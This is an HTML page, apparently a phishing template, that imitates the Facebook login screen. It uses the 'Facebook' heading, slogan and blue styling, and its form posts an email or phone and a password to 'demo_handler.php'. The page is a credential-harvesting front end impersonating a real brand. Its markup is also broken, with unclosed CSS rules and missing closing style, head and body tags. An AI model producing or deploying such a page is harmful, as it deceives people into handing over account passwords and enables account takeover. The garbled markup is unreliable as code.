<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Focialbook - Log in or Sign up</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .left {
            flex: 1;
            padding: 50px;
        }
        .left h1 {
            color: #3b5cff;
            font-size: 48px;
            margin-bottom: 10px;
        }
        .left p {
            font-size: 20px;
            color: #333;
        }
        .right {
            flex: 1;
            display: flex;
            justify-content: center;
        }
        .login-box {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            width: 350px;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .login-box button {
            width: 100%;
            padding: 12px;
            background-color: #3b5cff;
            color: #fff;
            font-size: 18px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 8px;
        }
        .login-box button:hover {
            background-color: #2a47d4;
        }
        .login-box a {
            display: block;
            text-align: center;
            margin: 10px 0;
            text-decoration: none;
            color: #3b5cff;
            font-size: 14px;

        .create-btn {
            background-color: #2ecc71 !important;

        .create-btn:hover {

<div class="container">
    <div class="left">
        <h1>Facebook</h1>
        <p>facebook helps you connect and share with the people in your life.</p>
    </div>
    <div class="right">
        <div class="login-box">
            <form action="demo_handler.php" method="post">
                <input type="text" name="username" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log in</button>
                <a href="#">Forgotten password?</a>
                <hr>
                <button type="button" class="create-btn">Create new account</button>
            </form>
